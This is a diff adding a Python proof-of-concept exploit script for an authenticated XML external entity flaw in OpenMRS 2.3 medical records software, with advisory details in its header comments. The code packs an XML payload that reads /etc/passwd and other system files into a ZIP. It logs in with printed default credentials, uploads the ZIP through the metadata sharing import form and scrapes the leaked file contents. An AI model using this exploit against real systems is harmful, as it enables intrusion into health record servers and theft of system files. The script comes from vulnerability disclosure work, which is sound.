@@ -1,0 +1,288 @@
+#!/usr/bin/env python
+#
+# OpenMRS 2.3 (1.11.4) XML External Entity (XXE) Processing PoC Exploit
+#
+#
+# Vendor: OpenMRS Inc.
+# Product web page: http://www.openmrs.org
+# Affected version: OpenMRS 2.3, 2.2, 2.1, 2.0 (Platform 1.11.4 (Build 6ebcaf), 1.11.2 and 1.10.0)
+#                   OpenMRS-TB System (OpenMRS 1.9.7 (Build 60bd9b))
+#
+# Summary: OpenMRS is an application which enables design of a customized medical
+# records system with no programming knowledge (although medical and systems analysis
+# knowledge is required). It is a common framework upon which medical informatics
+# efforts in developing countries can be built.
+#
+# Desc: The vulnerability is caused due to an error when parsing XML entities within
+# ZIP archives and can be exploited to e.g. disclose data from local resources or cause
+# a DoS condition (billion laughs) via a specially crafted XML file including external
+# entity references.
+#
+#
+# Tested on: Ubuntu 12.04.5 LTS
+#            Apache Tomcat/7.0.26
+#            Apache Tomcat/6.0.36
+#            Apache Coyote/1.1
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2015-5289
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5289.php
+#
+# Affected: OpenMRS Core, Serialization.Xstream module, Metadata Sharing module
+# Severity: Major
+# Exploit: Remote Code Execution by an authenticated user
+#
+# Vendor Bug Fixes:
+#
+# Disabled serialization and deserialization of dynamic proxies
+# Disabled deserialization of external entities in XML files
+# Disabled spring's Expression Language support
+#
+# https://talk.openmrs.org/t/openmrs-security-advisories-2015-11-30/3868
+# https://talk.openmrs.org/t/critical-security-advisory-2015-11-25/3824
+# https://wiki.openmrs.org/display/RES/Release+Notes+2.3.1
+# http://openmrs.org/2015/12/reference-application-2-3-1-released/
+# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.9.10
+# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.10.3
+# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.11.5
+# https://modules.openmrs.org/modulus/api/releases/1308/download/serialization.xstream-0.2.10.omod
+# https://modules.openmrs.org/modulus/api/releases/1309/download/metadatasharing-1.1.10.omod
+# https://modules.openmrs.org/modulus/api/releases/1303/download/reporting-0.9.8.1.omod
+#
+# OpenMRS platform has been upgraded to version 1.11.5
+# Reporting module has been upgraded to version 0.9.8.1
+# Metadata sharing module has been upgraded to version 1.1.10
+# Serialization.xstream module has been upgraded to version 0.2.10
+#
+# Who is affected?
+#
+# Anyone running OpenMRS Platform (1.9.0 and later)
+# Anyone running OpenMRS Reference Application 2.0, 2.1, 2.2, 2.3
+# Anyone that has installed the serialization.xstream module except for the newly released 0.2.10 version.
+# Anyone that has installed the metadatasharing module except for the newly released 1.1.10 version.
+#
+#
+# 02.11.2015
+#
+
+
+import itertools, mimetools, mimetypes
+import cookielib, urllib, urllib2, sys
+import time, datetime, re, zipfile, os
+import binascii
+
+from urllib2 import URLError
+
+global bindata
+
+piton = os.path.basename(sys.argv[0])
+
+def bannerche():
+	print '''
+ @-------------------------------------------------@
+ |                                                 |
+ |      OpenMRS 2.3 Authenticated XXE Exploit      |
+ |               ID: ZSL-2015-5289                 |
+ |       Copyleft (c) 2015, Zero Science Lab       |
+ |                                                 |
+ @-------------------------------------------------@
+          '''
+	if len(sys.argv) < 4:
+		print '\n[+] Usage: '+piton+' <host> <port> <path> \n'
+		print '[+] Example: '+piton+' uat05.zeroscience.mk 8080 openmrs\n'
+		sys.exit()
+
+bannerche()
+
+print '[+] Date: '+str(datetime.date.today())
+
+payload = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ZSL [
+   <!ENTITY xxe1 SYSTEM "file:////etc/passwd" >
+   <!ENTITY xxe2 SYSTEM "file:///etc/resolv.conf" >
+   <!ENTITY xxe3 SYSTEM "file:///etc/issue" >]>
+<package id="1" uuid="eecb64f8-35b0-412b-acda-3d83edf4ee63">
+  <dateCreated id="2">2015-11-06 10:47:19</dateCreated>
+  <name>&xxe1;</name>
+  <description>&xxe2;</description>
+  <openmrsVersion>&xxe3;</openmrsVersion>
+  <version>1</version>
+</package>'''
+
+print '[+] Creating header.xml file.'
+file = open('header.xml', 'w')
+file.write(payload)
+file.close()
+time.sleep(1)
+print '[+] Packing evil XML file.'
+
+with zipfile.ZipFile('xxe.zip', 'w') as devzip:
+    devzip.write('header.xml')
+	
+os.remove('header.xml')
+print '[+] XML file vacuumed.'
+time.sleep(1)
+
+filename = 'xxe.zip'
+with open(filename, 'rb') as f:
+    content = f.read()
+hexo = binascii.hexlify(content)
+bindata = binascii.unhexlify(hexo)
+
+print '[+] File xxe.zip successfully created!'
+print '[+] Initialising communication.'
+
+host = sys.argv[1]
+port = sys.argv[2]
+path = sys.argv[3]
+
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+print '[+] Probing target http://'+host+':'+port+'/'+path+'/'
+
+try:
+	checkhost = opener.open('http://'+host+':'+port+'/'+path+'/login.htm')
+	hostresp = checkhost.read()
+except urllib2.HTTPError, errorzio:
+	if errorzio.code == 404:
+		print '[+] Error:'
+		print '[+] Check your path entry!'
+		print
+		sys.exit()
+except URLError, errorziocvaj:
+	if errorziocvaj.reason:
+		print '[+] Error:'
+		print '[+] Check your hostname entry!'
+		print
+		sys.exit()
+
+print '[+] Target seems OK.'
+print '[+] Login please:'
+
+print '''
+Username:  doctor      nurse      clerk      sysadmin      admin      scheduler
+Password: Doctor123   Nurse123   Clerk123   Sysadmin123   Admin123   Scheduler123
+'''
+
+username = raw_input('[*] Enter username: ')
+password = raw_input('[*] Enter password: ')
+
+login_data = urllib.urlencode({
+	'username' : username,
+	'password' : password,
+	'sessionLocation' : '3',
+	'redirectUrl' : '/'+path+'/module/metadatasharing/import/list.form'
+})
+
+login = opener.open('http://'+host+':'+port+'/'+path+'/login.htm', login_data)
+auth = login.read()
+
+for session in cj:
+	sessid = session.name
+
+print '[+] Mapping session ID.'
+ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
+cookie = ses_chk.group(0)
+print '[+] Cookie: '+cookie
+
+if re.search(r'Invalid username/password. Please try again', auth):
+	print '[+] Incorrect username or password.'
+	print
+	sys.exit()
+else:
+	print '[+] Authenticated!'
+
+
+opener.open('http://'+host+':'+port+'/'+path+'/module/metadatasharing/import/list.form')
+print '[+] Sending payload.'
+
+class MultiPartForm(object):
+
+    def __init__(self):
+        self.form_fields = []
+        self.files = []
+        self.boundary = mimetools.choose_boundary()
+        return
+    
+    def get_content_type(self):
+        return 'multipart/form-data; boundary=%s' % self.boundary
+
+    def add_field(self, name, value):
+        self.form_fields.append((name, value))
+        return
+
+    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
+        body = fileHandle.read()
+        if mimetype is None:
+            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
+        self.files.append((fieldname, filename, mimetype, body))
+        return
+    
+    def __str__(self):
+
+        parts = []
+        part_boundary = '--' + self.boundary
+        
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: form-data; name="%s"' % name,
+              '',
+              value,
+            ]
+            for name, value in self.form_fields
+            )
+        
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: file; name="%s"; filename="%s"' % \
+                 (field_name, filename),
+              'Content-Type: %s' % content_type,
+              '',
+              body,
+            ]
+            for field_name, filename, content_type, body in self.files
+            )
+        
+        flattened = list(itertools.chain(*parts))
+        flattened.append('--' + self.boundary + '--')
+        flattened.append('')
+        return '\r\n'.join(flattened)
+
+if __name__ == '__main__':
+    form = MultiPartForm()
+    form.add_field('file"; filename="xxe.zip', bindata)
+    form.add_field('url', '')
+    request = urllib2.Request('http://'+host+':'+port+'/'+path+'/module/metadatasharing/import/upload.form')
+    request.add_header('User-agent', 'joxypoxy 6.5')
+    body = str(form)
+    request.add_header('Origin', 'http://'+host+':'+port)
+    request.add_header('Accept-Encoding', 'gzip, deflate')
+    request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
+    request.add_header('Accept-Language', 'en-US,en;q=0.8')
+    request.add_header('Cache-Control', 'max-age=0')
+    request.add_header('Upgrade-Insecure-Requests', '1')
+    request.add_header('Referer', 'http://'+host+':'+port+'/'+path+'/module/metadatasharing/import/upload.form')
+    request.add_header('Content-type', form.get_content_type())
+    request.add_header('Cookie', cookie)
+    request.add_header('Content-length', len(body))
+    request.add_data(body)
+    request.get_data()
+    urllib2.urlopen(request).read()
+
+
+time.sleep(1)
+print '[+] Retrieving /etc/passwd:'
+time.sleep(2)
+getinfo = opener.open('http://'+host+':'+port+'/'+path+'/module/metadatasharing/import/validate.form')
+readinfo = getinfo.read()
+striphtml = re.sub("<.*?>", "", readinfo)
+match = re.search(r'root:.*/bin/bash', striphtml, re.DOTALL)
+print '\n--------------------------------------------------------'
+print match.group(0)
+print '--------------------------------------------------------'
+
+sys.exit()
